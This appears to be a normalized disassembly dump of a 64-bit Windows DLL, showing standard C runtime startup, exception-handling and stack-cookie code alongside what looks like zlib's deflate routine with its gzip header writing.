mov rcx r9
add rsp 0x20
pop rbx
jmp sub_10010a60
movzx eax al
and eax 0xfffffff0
cdqe
add r9 rax
sub_100109e0
sub rsp 0x28
mov rcx [ r9 + 0x38 ]
mov r10 r9
mov r8 rdx
mov eax [ rcx ]
mov r9d eax
and r9d 0xfffffff8
test al 0x4
je r-xdata
movsxd rax r9d
mov r9 [ rax + r8 ]
mov rax [ r10 + 0x10 ]
mov ecx [ rax + 0x8 ]
add rcx [ r10 + 0x8 ]
movzx eax [ rcx + 0x3 ]
test al 0xf
je r-xdata
mov eax [ rcx + 0x8 ]
movsxd r8 [ rcx + 0x4 ]
neg eax
add r8 rdx
movsxd rcx eax
and r8 rcx
xor rdx r9
mov rcx rdx
call sub_10010a60
mov eax 0x1
add rsp 0x28
retn
movzx eax al
and eax 0xfffffff0
cdqe
add rdx rax
sub_10010a80
sub rsp 0x28
test dl 0x2
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x40 ] rsi
mov esi edx
mov rbx rcx
je r-xdata
call ?_type_info_dtor_internal_method@type_info@@QEAAXXZ
test sil 0x1
je r-xdata
mov r8d [ rcx - 0x8 ]
lea r9 [ ?_type_info_dtor_internal_method@type_info@@QEAAXXZ ]
mov edx 0x18
mov [ rsp + 0x48 ] rdi
call sub_10011210
test sil 0x1
je r-xdata
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x28
retn
mov rcx rbx
call ??3@YAXPEAX@Z
lea rax [ rbx - 0x8 ]
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x28
retn
lea rcx [ rbx - 0x8 ]
call operator delete
sub_10010b10
sub rsp 0x28
mov [ rsp + 0x30 ] rbx
mov rbx [ r9 + 0x38 ]
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x40 ] rsi
mov rsi rdx
mov [ rsp + 0x48 ] rdi
mov rbp rcx
mov [ rsp + 0x20 ] r12
mov r12 r8
lea r8 [ rbx + 0x4 ]
mov rdx r9
mov rcx rsi
mov rdi r9
call sub_10010970
test [ rbp + 0x4 ] 0x66
mov r11d [ rbx + 0x4 ]
mov rbx [ rsp + 0x30 ]
jne r-xdata
and r11d 0x2
and r11d 0x1
jmp r-xdata
mov eax 0x1
mov r9 rdi
mov r8 r12
mov rdx rsi
mov rcx rbp
call __CxxFrameHandler3
jmp r-xdata
test r11d r11d
je r-xdata
mov r12 [ rsp + 0x20 ]
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x28
retn
sub_10010bb0
push rbx
sub rsp 0x20
mov ecx 0x100
call [ _malloc_crt@IAT ]
mov rcx rax
mov rbx rax
call [ _encode_pointer@IAT ]
test rbx rbx
mov [ rw-data ] rax
mov [ rw-data ] rax
jne r-xdata
mov [ rbx ] 0x0
call sub_100113d0
lea rcx [ sub_10011420 ]
call sub_100113b0
lea rcx [ sub_100112d0 ]
call sub_100113b0
xor eax eax
add rsp 0x20
pop rbx
retn
lea eax [ rbx + 0x1 ]
add rsp 0x20
pop rbx
retn
sub_10010c20
sub rsp 0x48
test edx edx
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rbp
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov [ rsp + 0x40 ] r12
mov [ rsp + 0x38 ] r13
mov rbp r8
mov r12 rcx
mov r13d 0x1
jne r-xdata
cmp edx r13d
jne r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
mov eax r13d
mov rax [ gs : 0x30 ]
xor ebx ebx
mov rdi [ rax + 0x8 ]
xor eax eax
mov esi ebx
[ rw-data ] rdi
je r-xdata
xor eax eax
jmp r-xdata
sub eax r13d
mov [ rw-data ] eax
xor eax eax
[ rw-data ] r13
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp rax rdi
je r-xdata
mov r13 [ rsp + 0x38 ]
mov r12 [ rsp + 0x40 ]
mov rdi [ rsp + 0x68 ]
mov rsi [ rsp + 0x60 ]
mov rbp [ rsp + 0x58 ]
mov rbx [ rsp + 0x50 ]
add rsp 0x48
retn
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
nop
nop
lea rdx [ r--data ]
lea rcx [ r--data ]
mov [ rw-data ] r13d
call _initterm_e
test eax eax
jne r-xdata
mov ecx 0x1f
call _amsg_exit
jmp r-xdata
mov esi r13d
mov ecx 0x3e8
call [ Sleep@IAT ]
xor eax eax
[ rw-data ] rdi
jne r-xdata
mov rcx [ rw-data ]
call [ _decode_pointer@IAT ]
test rax rax
mov rdi rax
je r-xdata
mov ecx 0x1f
call _amsg_exit
jmp r-xdata
mov ecx 0x3e8
call [ Sleep@IAT ]
xor eax eax
[ rw-data ] r13
jne r-xdata
lea rdx [ r--data ]
lea rcx [ r--data ]
call _initterm
mov [ rw-data ] 0x2
test esi esi
jne r-xdata
jmp r-xdata
xor ebx ebx
mov [ rw-data ] ebx
xchg [ rw-data ] rbx
jmp r-xdata
mov rcx [ rw-data ]
call [ _decode_pointer@IAT ]
lea rbx [ rax - 0x8 ]
cmp rbx rdi
jb r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xchg [ rw-data ] rbx
mov rcx rdi
call [ free@IAT ]
call [ _encoded_null@IAT ]
mov [ rw-data ] rax
mov [ rw-data ] rax
nop
add [ rw-data ] r13d
lea rcx [ rw-data ]
call sub_100114f0
test eax eax
je r-xdata
sub rbx 0x8
cmp rbx rdi
jae r-xdata
call rax
mov r8 rbp
mov edx 0x2
mov rcx r12
call [ rw-data ]
mov rax [ rbx ]
test rax rax
je r-xdata
sub_10010e30
sub rsp 0x38
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x50 ] rdi
mov [ rsp + 0x58 ] r12
mov rsi r8
mov edi edx
mov r12 rcx
mov ebx 0x1
mov [ rsp + 0x20 ] ebx
mov [ rw-data ] edx
test edx edx
jne r-xdata
cmp edx 0x1
je r-xdata
cmp [ rw-data ] edx
jne r-xdata
mov rax [ r--data ]
test rax rax
je r-xdata
cmp edx 0x2
jne r-xdata
xor ebx ebx
mov [ rsp + 0x20 ] ebx
jmp r-xdata
test ebx ebx
je r-xdata
call rax
mov ebx eax
mov [ rsp + 0x20 ] eax
mov r8 rsi
mov edx edi
mov rcx r12
call sub_10007c60
mov ebx eax
mov [ rsp + 0x20 ] eax
cmp edi 0x1
jne r-xdata
jmp r-xdata
test ebx ebx
je r-xdata
mov r8 rsi
mov edx edi
mov rcx r12
call sub_10010c20
mov ebx eax
mov [ rsp + 0x20 ] eax
test edi edi
je r-xdata
test eax eax
jne r-xdata
mov [ rw-data ] 0xffffffff
mov eax ebx
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
mov r12 [ rsp + 0x58 ]
add rsp 0x38
retn
mov r8 rsi
mov edx edi
mov rcx r12
call sub_10010c20
test eax eax
jne r-xdata
cmp edi 0x3
jne r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call sub_10007c60
mov r8 rsi
xor edx edx
mov rcx r12
call sub_10010c20
mov r11 [ r--data ]
test r11 r11
je r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov [ rsp + 0x20 ] ebx
jmp r-xdata
mov r8 rsi
xor edx edx
mov rcx r12
call r11
mov rax [ r--data ]
test rax rax
je r-xdata
mov r8 rsi
mov edx edi
mov rcx r12
call rax
mov ebx eax
mov [ rsp + 0x20 ] eax
_start
sub rsp 0x28
cmp edx 0x1
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x48 ] rdi
mov ebx edx
mov rsi rcx
mov rdi r8
jne r-xdata
mov r8 rdi
mov edx ebx
mov rcx rsi
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x28
jmp sub_10010e30
call sub_10011570
sub_10011010
mov [ rsp + 0x8 ] rcx
sub rsp 0x88
lea rcx [ rw-data ]
call [ RtlCaptureContext@IAT ]
mov rax [ rw-data ]
mov [ rsp + 0x58 ] rax
xor r8d r8d
lea rdx [ rsp + 0x60 ]
mov rcx [ rsp + 0x58 ]
call RtlLookupFunctionEntry
mov [ rsp + 0x50 ] rax
cmp [ rsp + 0x50 ] 0x0
je r-xdata
mov rax [ rsp + 0x88 ]
mov [ rw-data ] rax
lea rax [ rsp + 0x88 ]
add rax 0x8
mov [ rw-data ] rax
mov [ rsp + 0x38 ] 0x0
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x28 ] rax
lea rax [ rw-data ]
mov [ rsp + 0x20 ] rax
mov r9 [ rsp + 0x50 ]
mov r8 [ rsp + 0x58 ]
mov rdx [ rsp + 0x60 ]
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov edx 0xc0000409
mov rcx rax
call [ TerminateProcess@IAT ]
add rsp 0x88
retn
mov ecx 0x1
call __crt_debugger_hook
mov rax [ rw-data ]
mov [ rw-data ] rax
mov rax [ rsp + 0x90 ]
mov [ rw-data ] rax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov rax [ rw-data ]
mov [ rsp + 0x68 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x70 ] rax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
mov ecx 0x1
call __crt_debugger_hook
xor ecx ecx
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ r--data ]
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
sub_10011160
mov [ rsp + 0x18 ] r8d
mov [ rsp + 0x8 ] rcx
sub rsp 0x68
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x50 ] rdi
mov [ rsp + 0x48 ] r12
mov rsi r9
mov edi r8d
mov r12 rdx
mov rbx rcx
nop
jmp r-xdata
sub rbx r12
mov [ rsp + 0x70 ] rbx
mov rcx rbx
call rsi
jmp r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x50 ]
mov r12 [ rsp + 0x48 ]
add rsp 0x68
retn
sub edi 0x1
mov [ rsp + 0x80 ] edi
js r-xdata
sub_100111d0
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x38 ] rcx
mov [ rbp + 0x28 ] rcx
mov rax [ rbp + 0x28 ]
mov rcx [ rax ]
mov [ rbp + 0x30 ] rcx
mov rax [ rbp + 0x30 ]
cmp [ rax ] 0xe06d7363
je r-xdata
call ?terminate@@YAXXZ
mov [ rbp + 0x20 ] 0x0
mov eax [ rbp + 0x20 ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_10011210
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8d
mov [ rsp + 0x10 ] rdx
sub rsp 0x58
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x40 ] rdi
mov [ rsp + 0x38 ] r12
mov r12 r9
movsxd rdi r8d
mov rsi rdx
mov [ rsp + 0x20 ] 0x0
mov rbx rdi
imul rbx rdx
add rbx rcx
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x20 ] 0x1
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x40 ]
mov r12 [ rsp + 0x38 ]
add rsp 0x58
retn
sub rbx rsi
mov [ rsp + 0x60 ] rbx
mov rcx rbx
call r12
jmp r-xdata
sub edi 0x1
mov [ rsp + 0x70 ] edi
js r-xdata
sub_100112a0
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x20 ] 0x0
jne r-xdata
add rsp 0x20
pop rbp
retn
mov r9 [ rbp + 0x78 ]
mov r8d [ rbp + 0x70 ]
mov rdx [ rbp + 0x68 ]
mov rcx [ rbp + 0x60 ]
call sub_10011160
sub_100112e0
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rw-data ]
call [ _decode_pointer@IAT ]
mov [ rsp + 0x38 ] rax
cmp rax 0xffffffffffffffff
jne r-xdata
mov ecx 0x8
call _lock
nop
mov rcx [ rw-data ]
call [ _decode_pointer@IAT ]
mov [ rsp + 0x38 ] rax
mov rcx [ rw-data ]
call [ _decode_pointer@IAT ]
mov [ rsp + 0x40 ] rax
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call __dllonexit
mov rbx rax
mov rcx [ rsp + 0x38 ]
call [ _encode_pointer@IAT ]
mov [ rw-data ] rax
mov rcx [ rsp + 0x40 ]
call [ _encode_pointer@IAT ]
mov [ rw-data ] rax
mov ecx 0x8
call _unlock
mov rax rbx
mov rcx rbx
call [ _onexit@IAT ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_100113d0
sub rsp 0x28
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rdi
lea rdi [ r--data ]
lea rbx [ r--data ]
cmp rbx rdi
jae r-xdata
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
mov rax [ rbx ]
test rax rax
je r-xdata
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rax
sub_10011420
sub rsp 0x28
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rdi
lea rdi [ r--data ]
lea rbx [ r--data ]
cmp rbx rdi
jae r-xdata
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
mov rax [ rbx ]
test rax rax
je r-xdata
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rax
sub_100114a0
movsxd r8 [ rcx + 0x3c ]
xor r9d r9d
mov r10 rdx
add r8 rcx
movzx eax [ r8 + 0x14 ]
movzx r11d [ r8 + 0x6 ]
test r11d r11d
lea rcx [ rax + r8 + 0x18 ]
je r-xdata
xor eax eax
retn
mov edx [ rcx + 0xc ]
cmp r10 rdx
jb r-xdata
add r9d 0x1
add rcx 0x28
cmp r9d r11d
jb r-xdata
mov eax [ rcx + 0x8 ]
add eax edx
cmp r10 rax
jb r-xdata
mov rax rcx
retn
sub_100114f0
sub rsp 0x28
mov r8 rcx
lea rcx [ __dos_header ]
call sub_10011470
test eax eax
je r-xdata
add rsp 0x28
retn
sub r8 rcx
mov rdx r8
call sub_100114a0
test rax rax
je r-xdata
mov eax [ rax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
jmp r-xdata
sub_10011570
sub rsp 0x28
mov rax [ rw-data ]
mov [ rsp + 0x48 ] rdi
mov rdi 0x2b992ddfa232
cmp rax rdi
mov [ rsp + 0x30 ] 0x0
je r-xdata
lea rcx [ rsp + 0x30 ]
mov [ rsp + 0x40 ] rbx
call [ GetSystemTimeAsFileTime@IAT ]
mov rbx [ rsp + 0x30 ]
call [ GetCurrentProcessId@IAT ]
mov r11d eax
xor rbx r11
call [ GetCurrentThreadId@IAT ]
mov r11d eax
xor rbx r11
call [ GetTickCount@IAT ]
lea rcx [ rsp + 0x38 ]
mov r11d eax
xor rbx r11
call [ QueryPerformanceCounter@IAT ]
mov r11 [ rsp + 0x38 ]
xor r11 rbx
mov rbx [ rsp + 0x40 ]
mov rax 0xffffffffffff
and r11 rax
mov rax 0x2b992ddfa233
cmp r11 rdi
mov rdi [ rsp + 0x48 ]
cmove r11 rax
mov [ rw-data ] r11
not r11
mov [ rw-data ] r11
add rsp 0x28
retn
not rax
mov [ rw-data ] rax
mov rdi [ rsp + 0x48 ]
add rsp 0x28
retn
sub_10011660
mov r11 rsp
sub rsp 0x98
mov eax [ rdx ]
mov [ r11 - 0x78 ] r8
mov [ r11 - 0x70 ] r9d
mov [ r11 - 0x68 ] rcx
mov [ rsp + 0x38 ] eax
xor eax eax
mov [ r11 - 0x10 ] rdi
mov rdi rdx
mov edx [ rsp + 0xc0 ]
lea r9d [ rax + 0x58 ]
lea r8 [ r--data ]
lea rcx [ r11 - 0x78 ]
mov [ r11 - 0x48 ] rax
mov [ r11 - 0x40 ] rax
mov [ r11 - 0x38 ] rax
call sub_100135b0
test eax eax
jne r-xdata
mov rdi [ rsp + 0x88 ]
add rsp 0x98
retn
lea edx [ rax + 0x4 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x90 ] rbx
call sub_100117c0
cmp eax 0x1
mov ebx eax
je r-xdata
mov eax [ rsp + 0x3c ]
lea rcx [ rsp + 0x20 ]
mov [ rdi ] eax
call sub_100120a0
lea rcx [ rsp + 0x20 ]
call sub_100120a0
mov eax 0xfffffffb
test ebx ebx
cmove ebx eax
mov eax ebx
jmp r-xdata
mov rbx [ rsp + 0x90 ]
sub_10011740
sub rsp 0x28
mov eax [ rcx + 0x18 ]
mov rdx [ rcx + 0x28 ]
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x48 ] rdi
mov edi [ rdx + 0x28 ]
mov rsi rcx
cmp edi eax
cmova edi eax
test edi edi
je r-xdata
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x28
retn
mov rdx [ rdx + 0x20 ]
mov rcx [ rcx + 0x10 ]
mov r8d edi
mov [ rsp + 0x38 ] rbx
mov ebx edi
call memcpy
add [ rsi + 0x10 ] rbx
mov rax [ rsi + 0x28 ]
add [ rax + 0x20 ] rbx
add [ rsi + 0x1c ] edi
sub [ rsi + 0x18 ] edi
mov rax [ rsi + 0x28 ]
mov rbx [ rsp + 0x38 ]
sub [ rax + 0x28 ] edi
mov rcx [ rsi + 0x28 ]
cmp [ rcx + 0x28 ] 0x0
jne r-xdata
mov rax [ rcx + 0x10 ]
mov [ rcx + 0x20 ] rax
sub_100117c0
sub rsp 0x38
test rcx rcx
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rbp
mov [ rsp + 0x58 ] rdi
mov ebp edx
mov rdi rcx
je r-xdata
mov rdi [ rsp + 0x58 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
mov eax 0xfffffffe
add rsp 0x38
retn
mov rbx [ rcx + 0x28 ]
test rbx rbx
je r-xdata
cmp edx 0x4
ja r-xdata
cmp [ rcx + 0x10 ] 0x0
je r-xdata
mov rax [ r--data ]
mov [ rcx + 0x20 ] rax
cmp [ rcx ] 0x0
jne r-xdata
mov eax [ rbx + 0x8 ]
cmp eax 0x29a
jne r-xdata
cmp [ rcx + 0x8 ] 0x0
jne r-xdata
cmp [ rcx + 0x18 ] 0x0
jne r-xdata
cmp edx 0x4
jne r-xdata
mov [ rsp + 0x30 ] r12
mov [ rsp + 0x28 ] r13
mov r13d [ rbx + 0x40 ]
xor r12d r12d
cmp eax 0x2a
mov [ rbx + 0x40 ] edx
mov [ rbx ] rcx
jne r-xdata
mov rax [ r--data ]
mov [ rcx + 0x20 ] rax
mov eax 0xfffffffb
mov rdi [ rsp + 0x58 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x38
retn
cmp [ rbx + 0x8 ] 0x45
jne r-xdata
cmp [ rbx + 0x2c ] 0x2
jne r-xdata
cmp [ rbx + 0x8 ] 0x49
mov [ rsp + 0x50 ] rsi
jne r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x10 ] r12
je r-xdata
mov ecx [ rbx + 0x48 ]
sub ecx 0x8
shl ecx 0xc
add ecx 0x800
cmp [ rbx + 0xb0 ] 0x2
jge r-xdata
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_10015a70
mov [ rdi + 0x4c ] eax
mov ecx [ rbx + 0x28 ]
mov rax [ rbx + 0x10 ]
mov [ rcx + rax ] 0x1f
add [ rbx + 0x28 ] 0x1
mov ecx [ rbx + 0x28 ]
mov rax [ rbx + 0x10 ]
mov [ rcx + rax ] 0x8b
add [ rbx + 0x28 ] 0x1
mov ecx [ rbx + 0x28 ]
mov rax [ rbx + 0x10 ]
mov [ rcx + rax ] 0x8
add [ rbx + 0x28 ] 0x1
mov r8 [ rbx + 0x30 ]
test r8 r8
mov r9d [ rbx + 0x28 ]
jne r-xdata
cmp [ rbx + 0x8 ] 0x5b
jne r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x20 ] r12
je r-xdata
mov [ rbx + 0x8 ] 0x49
movzx eax [ rax + 0x18 ]
mov r10d [ rbx + 0x28 ]
cmp [ rbx + 0x38 ] eax
jae r-xdata
mov eax r12d
mov edx [ rbx + 0xac ]
cmp edx 0x2
jl r-xdata
mov rax [ r8 + 0x30 ]
neg rax
mov eax [ r8 + 0x3c ]
sbb dl dl
and dl 0x10
neg eax
mov rax [ r8 + 0x20 ]
sbb cl cl
and cl 0x2
add dl cl
neg rax
mov rax [ r8 + 0x10 ]
sbb cl cl
and cl 0x8
add dl cl
neg rax
sbb cl cl
and cl 0x4
add dl cl
cmp [ r8 ] r12d
setne al
add dl al
mov rax [ rbx + 0x10 ]
mov [ r9 + rax ] dl
add [ rbx + 0x28 ] 0x1
mov edx [ rbx + 0x28 ]
mov rax [ rbx + 0x30 ]
mov rcx [ rbx + 0x10 ]
movzx eax [ rax + 0x4 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
mov edx [ rbx + 0x28 ]
mov rax [ rbx + 0x30 ]
mov rcx [ rbx + 0x10 ]
movzx eax [ rax + 0x5 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
mov edx [ rbx + 0x28 ]
mov rax [ rbx + 0x30 ]
mov rcx [ rbx + 0x10 ]
movzx eax [ rax + 0x6 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
mov rax [ rbx + 0x30 ]
movzx eax [ rax + 0x7 ]
mov edx [ rbx + 0x28 ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
mov eax [ rbx + 0xac ]
add [ rbx + 0x28 ] 0x1
cmp eax 0x9
jne r-xdata
mov rax [ rbx + 0x10 ]
mov [ r9 + rax ] r12b
add [ rbx + 0x28 ] 0x1
mov ecx [ rbx + 0x28 ]
mov rax [ rbx + 0x10 ]
mov [ rcx + rax ] r12b
add [ rbx + 0x28 ] 0x1
mov ecx [ rbx + 0x28 ]
mov rax [ rbx + 0x10 ]
mov [ rcx + rax ] r12b
add [ rbx + 0x28 ] 0x1
mov ecx [ rbx + 0x28 ]
mov rax [ rbx + 0x10 ]
mov [ rcx + rax ] r12b
add [ rbx + 0x28 ] 0x1
mov ecx [ rbx + 0x28 ]
mov rax [ rbx + 0x10 ]
mov [ rcx + rax ] r12b
mov eax [ rbx + 0xac ]
add [ rbx + 0x28 ] 0x1
cmp eax 0x9
jne r-xdata
cmp [ rbx + 0x8 ] 0x67
mov rsi [ rsp + 0x50 ]
jne r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x30 ] r12
je r-xdata
mov [ rbx + 0x8 ] 0x5b
mov edx [ rbx + 0x28 ]
nop
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x3c ] r12d
je r-xdata
mov ecx [ rbx + 0x28 ]
cmp ecx [ rbx + 0x18 ]
jne r-xdata
mov eax 0x8421085
mov [ rbx + 0x8 ] 0x71
mul ecx
sub ecx edx
shr ecx 0x1
add edx ecx
mov rcx rbx
shr edx 0x4
add edx 0x1
imul edx edx 0x1f
call sub_10011710
cmp [ rbx + 0x94 ] r12d
je r-xdata
or ecx 0x20
cmp edx 0x6
jge r-xdata
cmp [ rbx + 0xb0 ] 0x2
jge r-xdata
lea edx [ rax - 0x7 ]
jmp r-xdata
cmp [ rbx + 0xb0 ] 0x2
jge r-xdata
lea edx [ rax - 0x7 ]
jmp r-xdata
cmp [ rbx + 0x28 ] r12d
je r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x3c ] r12d
je r-xdata
mov [ rbx + 0x8 ] 0x67
mov edx [ rbx + 0x28 ]
nop
nop
mov ecx [ rbx + 0x38 ]
mov rax [ rbx + 0x30 ]
mov rax [ rax + 0x20 ]
movzx esi [ rax + rcx ]
lea eax [ rcx + 0x1 ]
mov ecx r8d
mov [ rbx + 0x38 ] eax
mov rax [ rbx + 0x10 ]
mov [ rcx + rax ] sil
add [ rbx + 0x28 ] 0x1
test esi esi
jne r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x3c ] r12d
je r-xdata
mov rax [ rbx + 0x30 ]
mov ecx [ rax + 0x18 ]
cmp [ rbx + 0x38 ] ecx
jne r-xdata
mov r8d [ rbx + 0x28 ]
cmp r8d r10d
jbe r-xdata
mov rax [ rbx + 0x30 ]
mov r9d [ rbx + 0x38 ]
mov r8d ecx
mov rdx [ rax + 0x10 ]
mov rcx [ rbx + 0x10 ]
movzx eax [ r9 + rdx ]
mov [ r8 + rcx ] al
add [ rbx + 0x28 ] 0x1
add [ rbx + 0x38 ] 0x1
mov rax [ rbx + 0x30 ]
movzx ecx [ rax + 0x18 ]
cmp [ rbx + 0x38 ] ecx
jb r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x3c ] r12d
je r-xdata
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_100135f0
mov [ rdi + 0x4c ] eax
movzx edx [ rdi + 0x4e ]
call sub_10011710
movzx edx [ rdi + 0x4c ]
call sub_10011710
cmp edx 0x6
mov eax r12d
setne al
add eax 0x2
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov edx 0x4
cmp eax 0x2
jl r-xdata
mov ecx [ rbx + 0x28 ]
mov rax [ rbx + 0x10 ]
mov [ rcx + rax ] dl
add [ rbx + 0x28 ] 0x1
mov rax [ rbx + 0x30 ]
movzx eax [ rax + 0xc ]
mov edx [ rbx + 0x28 ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x10 ] r12
mov r8d [ rbx + 0x28 ]
je r-xdata
mov edx 0x4
cmp eax 0x2
jl r-xdata
mov ecx [ rbx + 0x28 ]
mov rax [ rbx + 0x10 ]
mov [ rcx + rax ] dl
add [ rbx + 0x28 ] 0x1
mov ecx [ rbx + 0x28 ]
mov rax [ rbx + 0x10 ]
mov [ rcx + rax ] 0xb
add [ rbx + 0x28 ] 0x1
mov [ rbx + 0x8 ] 0x71
jmp r-xdata
cmp [ rdi + 0x8 ] r12d
jne r-xdata
mov rcx rdi
call sub_10011740
cmp [ rdi + 0x18 ] r12d
jne r-xdata
mov [ rbx + 0x8 ] 0x71
mov eax [ rbx + 0x28 ]
add eax 0x2
cmp eax [ rbx + 0x18 ]
jbe r-xdata
mov ecx [ rbx + 0x38 ]
mov rax [ rbx + 0x30 ]
mov rax [ rax + 0x30 ]
movzx esi [ rax + rcx ]
lea eax [ rcx + 0x1 ]
mov ecx r8d
mov [ rbx + 0x38 ] eax
mov rax [ rbx + 0x10 ]
mov [ rcx + rax ] sil
add [ rbx + 0x28 ] 0x1
test esi esi
jne r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x3c ] r12d
je r-xdata
mov r8d [ rbx + 0x28 ]
cmp r8d [ rbx + 0x18 ]
jne r-xdata
jmp r-xdata
mov rcx rdi
call sub_10011740
mov r8d [ rbx + 0x28 ]
cmp r8d [ rbx + 0x18 ]
mov rdx r8
je r-xdata
cmp r8d edx
jbe r-xdata
mov [ rbx + 0x38 ] r12d
mov [ rbx + 0x8 ] 0x49
jmp r-xdata
mov ecx [ rdi + 0x4c ]
mov edx r10d
sub r8d r10d
add rdx [ rbx + 0x10 ]
call sub_10015a70
mov [ rdi + 0x4c ] eax
mov rcx rdi
call sub_10011740
mov ecx [ rbx + 0x28 ]
cmp ecx [ rbx + 0x18 ]
mov r10d ecx
je r-xdata
cmp ecx r10d
jbe r-xdata
shl eax 0x6
or ecx eax
cmp [ rbx + 0x94 ] r12d
je r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x3c ] r12d
je r-xdata
movzx eax [ rax + 0x18 ]
mov rcx [ rbx + 0x10 ]
mov [ r8 + rcx ] al
add [ rbx + 0x28 ] 0x1
mov rax [ rbx + 0x30 ]
mov edx [ rbx + 0x28 ]
movzx eax [ rax + 0x19 ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
mov r8d [ rbx + 0x28 ]
mov edx r12d
jmp r-xdata
mov edx r12d
jmp r-xdata
mov eax [ rbx + 0x8 ]
cmp eax 0x29a
jne r-xdata
cmp ebp r13d
jg r-xdata
mov [ rbx + 0x40 ] 0xffffffff
xor eax eax
mov ecx [ rbx + 0x28 ]
lea eax [ rcx + 0x2 ]
cmp eax [ rbx + 0x18 ]
ja r-xdata
mov rcx rdi
call sub_10011740
mov r8d [ rbx + 0x28 ]
cmp r8d [ rbx + 0x18 ]
jne r-xdata
jmp r-xdata
mov rcx rdi
call sub_10011740
mov r8d [ rbx + 0x28 ]
cmp r8d [ rbx + 0x18 ]
mov rdx r8
je r-xdata
cmp r8d edx
jbe r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x3c ] r12d
je r-xdata
mov esi 0x1
mov ecx [ rdi + 0x4c ]
sub r8d edx
mov edx edx
add rdx [ rbx + 0x10 ]
call sub_10015a70
mov [ rdi + 0x4c ] eax
sub ecx r10d
mov edx r10d
add rdx [ rbx + 0x10 ]
mov r8d ecx
mov ecx [ rdi + 0x4c ]
call sub_10015a70
mov [ rdi + 0x4c ] eax
mov [ rbx + 0x38 ] r12d
mov [ rbx + 0x8 ] 0x45
jmp r-xdata
